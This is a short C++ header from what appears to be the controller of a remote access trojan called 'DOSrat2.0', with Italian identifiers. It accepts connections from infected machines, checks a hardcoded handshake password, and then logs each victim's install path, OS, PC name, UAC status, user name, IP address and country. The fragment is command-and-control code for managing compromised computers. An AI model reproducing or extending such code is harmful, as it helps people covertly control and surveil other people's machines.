#pragma once

class COMUNICAZIONI
{
private:
	static void TerminaConnessione(SOCKET Sock)
	{
		TcpIP::SetTimeout(0, Sock);
		closesocket(Sock);
	}

public:
	static void Inizializzazione(int Index, SOCKET Sock)
	{
		char Pass[10]; // DOSrat2.0
		IPinfo GeoIP;

		TcpIP::SetTimeout(10000, Sock);

		if (recv(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
		{
			TerminaConnessione(Sock);
			return;
		}
		if ((string)Pass != "DOSrat2.0")
		{
			TerminaConnessione(Sock);
			return;
		}
		if (send(Sock, "DOSrat2.0", 10, 0) == SOCKET_ERROR)
		{
			TerminaConnessione(Sock);
			return;
		}

		TcpIP::SetTimeout(0, Sock);

		json data = json::parse(TcpIP::RecvString(Sock));

		Clients[Index].IsConnected = true;
		Clients[Index].info.InstallPath = data["InstallPath"];
		Clients[Index].info.OS = data["OS"];
		Clients[Index].info.PCname = data["PCname"];
		Clients[Index].info.UAC = data["UAC"];
		Clients[Index].info.UserName = data["UserName"];
		Clients[Index].info.Versione = data["Versione"];

		Clients[Index].info.IP = TcpIP::GetIP(Sock);
		Clients[Index].info.Nazione = (IPlocation::GetInfoFromIP(Clients[Index].info.IP, GeoIP) == 0) ? GeoIP.CountryCode : "";

		Clu->AggiornaCount();
		Clu->AggiornaTitolo();
	}


};